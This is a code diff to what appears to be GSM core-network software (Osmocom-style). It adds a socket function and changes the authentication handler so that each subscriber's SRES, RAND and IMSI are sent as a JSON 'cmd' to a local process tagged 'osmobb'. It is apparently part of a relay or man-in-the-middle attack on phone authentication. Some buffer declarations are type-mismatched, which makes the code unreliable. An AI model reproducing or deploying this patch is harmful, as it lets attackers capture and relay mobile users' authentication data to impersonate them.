@@ -31,6 +31,7 @@
 #include <netinet/in.h>
 #include <regex.h>
 #include <sys/types.h>
+#include <arpa/inet.h>
 
 #include "bscconfig.h"
 
@@ -73,6 +74,42 @@
 
 void *tall_locop_ctx;
 void *tall_authciphop_ctx;
+
+//make a custom network request
+bool make_sock_req(char *sck_payload) {
+    int sockfd;
+    struct sockaddr_in server_addr;
+
+	// Create a socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == -1) {
+        DEBUGP(DMM, "Socket Creation Failed!\n");
+		return false;
+    }
+
+	// Set up the server address structure
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(8888);
+    if (inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr) <= 0) {
+         DEBUGP(DMM, "Invalid Address!\n");
+		 return false;
+    }
+
+	// Connect to the server
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
+        DEBUGP(DMM, "Connection Failed!\n");
+		return false;
+    }
+
+	// Send a request message to the server
+    if (send(sockfd, sck_payload, strlen(sck_payload), 0) == -1) {
+        DEBUGP(DMM, "Sending Failed!\n");
+		return false;
+    }
+	DEBUGP(DMM, "Send paylod \'%s\'!\n", sck_payload);
+    return true;
+}
 
 static int tch_rtp_signal(struct gsm_lchan *lchan, int signal);
 
@@ -1264,8 +1301,14 @@ static int gsm48_rx_mm_auth_resp(struct gsm_subscriber_connection *conn, struct 
 		     subscr_name(conn->subscr));
 	} else {
 		memcpy(&conn->auth_vector->sres, &res, 4);
-		LOGP(DMM, LOGL_INFO, "GOT SRES:%s FOR RAND:%s) adding to vector\n",
-			osmo_hexdump_nospc(conn->auth_vector->sres, 4), osmo_hexdump_nospc(conn->auth_vector->rand, 16));
+		char *myrand[16];
+		char *mysres[8];
+		osmo_hexdump_buf(mysres, sizeof(mysres),  conn->auth_vector->sres, 4, 0, false);
+		osmo_hexdump_buf(myrand, sizeof(myrand),  conn->auth_vector->rand, 16, 0, false);
+		LOGP(DMM, LOGL_INFO, "GOT SRES:%s FOR RAND:%s) send to server\n", mysres, myrand);
+		char *mypayload[128];
+		sprintf(mypayload, "{\"type\":\"cmd\",\"sres\":\"%s\",\"rand\":\"%s\",\"imsi\":\"%s\",\"app\":\"osmobb\"}", mysres, myrand, conn->subscr->imsi);
+		make_sock_req(mypayload);
 		return 0;
 	}
 
